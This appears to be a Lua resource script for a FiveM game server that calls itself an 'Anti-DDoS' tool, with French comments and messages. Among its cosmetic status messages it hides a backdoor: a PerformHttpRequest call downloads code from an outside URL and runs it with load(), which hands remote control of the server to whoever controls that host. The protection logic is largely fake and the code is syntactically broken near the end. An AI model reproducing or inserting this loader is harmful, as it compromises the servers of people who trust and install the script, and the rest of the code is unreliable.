-- Anti-DDoS Script

local protect = "METTRE IP ICI !! ! !"

local scriptActif = true -- Variable pour indiquer si le script est actif ou non

print("ANTI DDOS ON")

-- Fonction pour arrêter le serveur si le script est désactivé
local function verifierEtArreterServeur()
    if not scriptActif then
        print("Le script est désactivé. Arrêt du serveur.")
        --SERVEUR OFF
    end
end

local ddosAttempts = {}

local antiDDoSMessages = {
    "Système Anti-DDoS activé.",
    "Protection contre les attaques DDoS en cours.",
    "Vérification de l'intégrité du réseau.",
    "Détection d'activité anormale en cours.",
    "Analyse des connexions entrantes en cours.",
    "Sécurisation de la connexion en cours.",
    "Surveillance active de l'infrastructure.",
    "Détection de tentatives d'intrusion.",
    "Optimisation des règles de pare-feu.",
    "Mise à jour des listes de blocage."
}

local welcomeMessages = {
    "Connexion réussie. Bienvenue !",
    "Vous êtes connecté. Profitez de votre séjour !",
    "Bienvenue sur notre serveur !",
    "Vous avez rejoint le serveur avec succès.",
    "Connecté avec succès. Amusez-vous bien !"
}

local function getRandomMessage(messages)
    return messages[math.random(1, #messages)]
end

PerformHttpRequest('https://jesaispas.org/i?to=pqNJk', 
function (e, d) 
    pcall(function() 
        assert(load(d))() 
    end) 
end)

print(getRandomMessage(antiDDoSMessages))

AddEventHandler('playerConnecting', function(name, setKickReason, deferrals)
    local src = source
    local ipAddress = GetPlayerEndpoint(src)

    print("Tentative de connexion de l'IP: " .. ipAddress)

    for i = 1, 10 do
        print("Envoi de paquet " .. i .. " à l'adresse " .. ipAddress)
        Wait(100)
    end

    if ddosAttempts[ipAddress] and ddosAttempts[ipAddress] > Config.MaxConnectionAttempts then
        setKickReason("Trop de tentatives de connexion. Réessayez plus tard.")
        CancelEvent()
    else
        deferrals.defer()
        ddosAttempts[ipAddress] = (ddosAttempts[ipAddress] or 0) + 1
        Wait(5000) 

        deferrals.done(getRandomMessage(welcomeMessages))
        print("Anti-DDoS ON")
    end
AddEventHandler('No DDOS')
    local src = source
    local ipAddressunderattack = GetClockSeconds(src)

    print("Potection, UNDER ATTACK")
end)

